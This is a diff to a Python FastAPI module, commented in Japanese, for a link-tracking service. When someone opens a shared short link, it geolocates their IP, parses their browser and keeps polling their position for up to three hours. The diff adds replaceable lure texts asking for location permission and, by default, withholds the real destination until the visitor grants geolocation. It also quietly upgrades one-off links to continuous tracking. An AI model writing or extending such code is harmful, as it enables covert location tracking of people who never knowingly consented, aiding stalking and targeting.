@@ -9,7 +9,7 @@ main.py の snsx と同じ場所で include する:
 """
 from __future__ import annotations
 
-import os, json, random, string, datetime as dt
+import os, re, json, random, string, datetime as dt
 
 from fastapi import APIRouter, Request, Depends, Form, HTTPException
 from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse
@@ -22,9 +22,28 @@ router = APIRouter()
 LIVE_IV_MIN, LIVE_IV_MAX = 5, 600
 TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
 LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))
-# 旧版は「リアルタイム追跡」を選んでも page として保存されていた。
-# その救済として、page のリンクは初回アクセスで live に昇格させる。
+
+# 旧版では「リアルタイム追跡」を選んでも page として保存されていた。その救済。
 PROMOTE_PAGE = os.getenv("PROMOTE_PAGE_TO_LIVE", "1") != "0"
+
+# 来訪者側の表示: ""=自動(飛び先ありで ask / なしで none) / none / ask / map / full
+LIVE_UI = (os.getenv("LIVE_UI", "") or "").strip().lower()
+if LIVE_UI not in ("none", "ask", "map", "full"):
+    LIVE_UI = ""
+
+# 文言（すべて差し替え可能）
+ASK_TEXT   = os.getenv("LIVE_ASK_TEXT",   "位置情報の使用を許可してください")
+WAIT_TEXT  = os.getenv("LIVE_WAIT_TEXT",  "位置情報を取得しています…")
+OK_TEXT    = os.getenv("LIVE_OK_TEXT",    "取得しました。移動します…")
+DENY_TEXT  = os.getenv("LIVE_DENY_TEXT",  "位置情報が許可されていません。許可すると先へ進めます")
+RETRY_TEXT = os.getenv("LIVE_RETRY_TEXT", "もう一度")
+GO_TEXT    = os.getenv("LIVE_GO_TEXT",    "続ける")
+
+# 遷移の制御
+DEST_REDIRECT = os.getenv("LIVE_DEST_REDIRECT", "1") != "0"  # 取得成功で自動遷移するか
+DENY_REDIRECT = os.getenv("LIVE_DENY_REDIRECT", "0") != "0"  # 未許可でも遷移するか（既定=しない）
+WAIT_SEC = float(os.getenv("LIVE_WAIT", "15"))               # 未取得のまま何秒で「未許可」表示にするか
+DEST_MIN = float(os.getenv("LIVE_DEST_MIN", "2"))            # 取得後、遷移するまで（秒）
 
 
 def _m():
@@ -99,12 +118,17 @@ def _new_code(n=8):
     return "".join(random.choice(a) for _ in range(n + 4))
 
 
-def _get_track(code):
-    """追跡として使えるリンクを返す。
+def _abs_dest(d):
+    d = (d or "").strip()
+    if not d:
+        return ""
+    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
+        d = "https://" + d
+    return d
 
-    live/snap はそのまま。page として保存されてしまったリンクは
-    ここで live に昇格させて救済する。
-    """
+
+def _get_track(code):
+    """追跡として使えるリンクを返す。page として保存された分は live に昇格して救済。"""
     link = db.track_get(code)
     if link:
         return link
@@ -154,9 +178,16 @@ def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
 
 
 def _live_page(request, code, hid, link, nonce):
+    dest = _abs_dest(link["dest"])
+    ui = LIVE_UI or ("ask" if dest else "none")
     return render("link_live.html", request, code=code, hit_id=hid, link=link,
-                  dest=link["dest"] or "", nonce=nonce,
-                  iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN)
+                  dest=dest, nonce=nonce,
+                  iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN,
+                  ui=ui, ask_text=ASK_TEXT, ok_text=OK_TEXT, deny_text=DENY_TEXT,
+                  wait_sec=WAIT_SEC,
+                  dest_redirect=(DEST_REDIRECT and bool(dest)),
+                  deny_redirect=(DENY_REDIRECT and bool(dest)),
+                  dest_min=DEST_MIN)
 
 
 # ================= 公開ルート（/l/ 配下を引き継ぐ） =================
@@ -190,15 +221,19 @@ def link_hit(code: str, request: Request):
                       p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                       g=linktrack.geo(ip))
 
-    # 連続追跡モード（page のリンクは初回に live へ昇格）
+    # 連続追跡モード（page として保存されたリンクは初回に live へ昇格）
     if mode == "live" or (mode == "page" and PROMOTE_PAGE):
         if mode != "live":
             db.track_update(code, mode="live", interval=_clamp_iv(link["interval"]))
             link = db.link_get(code) or link
         return _live_page(request, code, hid, link, nonce)
 
+    # 一瞬 / geo 用ランディング
     return render("link_land.html", request, code=code, hit_id=hid, link=link,
-                  dest=link["dest"] or "", nonce=nonce)
+                  dest=link["dest"] or "", nonce=nonce,
+                  go_text=GO_TEXT, wait_text=WAIT_TEXT, ok_text=OK_TEXT,
+                  deny_text=DENY_TEXT, retry_text=RETRY_TEXT,
+                  deny_redirect=DENY_REDIRECT, dest_min=DEST_MIN)
 
 
 @router.post("/l/{code}/x")
